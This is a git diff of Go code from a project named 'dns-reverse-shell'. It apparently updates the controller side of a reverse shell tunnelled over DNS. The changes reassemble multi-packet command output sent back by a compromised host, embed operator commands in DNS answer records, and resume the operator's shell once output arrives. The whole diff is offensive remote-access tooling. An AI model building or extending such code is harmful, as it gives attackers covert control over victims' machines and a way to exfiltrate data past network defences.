@@ -6,12 +6,15 @@ import (
 	"dns-reverse-shell/main/utils"
 	"fmt"
 	"github.com/miekg/dns"
+	"strings"
+	"time"
 )
 
 type dnsHandler struct {
 	server *DNSServer
 }
 
+// todo: refactor AND check for other todos
 func newDnsHandler(s *DNSServer) *dnsHandler {
 	return &dnsHandler{server: s}
 }
@@ -22,6 +25,7 @@ type DNSServer struct {
 	connectionHandler *connectionHandler
 	messageHandler    *protocol.MessageHandler
 	commandHandler    protocol.CommandHandler
+	messageBuffer     []string
 }
 
 func NewDnsServer(port string) *DNSServer {
@@ -77,8 +81,25 @@ func (s *DNSServer) poll(w dns.ResponseWriter, r *dns.Msg) func() {
 func (s *DNSServer) answer(w dns.ResponseWriter, r *dns.Msg) func(command string) {
 	return func(command string) {
 		if command == "ok" {
-			fmt.Println(utils.CurrentTimeAsLogFormat() + "answer received:")
-			fmt.Println(s.messageHandler.DecodeAnswerMsg(r))
+			if r.Answer != nil {
+				if s.messageBuffer == nil {
+					fmt.Println(utils.CurrentTimeAsLogFormat() + "receiving big message:")
+					s.messageBuffer = make([]string, 0)
+				}
+				time.Sleep(3 * time.Second)
+				fmt.Println("Packet " + strings.TrimSuffix(r.Answer[0].Header().Name, ".") + " received.")
+				s.messageBuffer = append(s.messageBuffer, s.messageHandler.DecodeAnswerMsg(r))
+				if r.Answer[0].Header().Name == "end." {
+					fmt.Println(utils.CurrentTimeAsLogFormat() + "answer received:")
+					fmt.Println(s.messageBuffer)
+					s.messageBuffer = nil
+					s.commandHandler.(*serverCommandHandler).shell.Resume()
+				}
+			} else {
+				fmt.Println(utils.CurrentTimeAsLogFormat() + "answer received:")
+				fmt.Println(s.messageHandler.DecodeAnswerMsg(r))
+				s.commandHandler.(*serverCommandHandler).shell.Resume()
+			}
 		}
 		s.sendAnswer(w, r, command)
 	}
@@ -89,8 +110,7 @@ func (s *DNSServer) exit() {
 }
 
 func (s *DNSServer) sendAnswer(w dns.ResponseWriter, r *dns.Msg, command string) {
-	msg := s.messageHandler.CreateAnswerMessage(r)
-	msg.Extra = s.messageHandler.BuildDNSExtra(command)
+	msg := s.messageHandler.CreateAnswerMessage(r, command)
 	s.writeMessage(w, msg)
 }
 
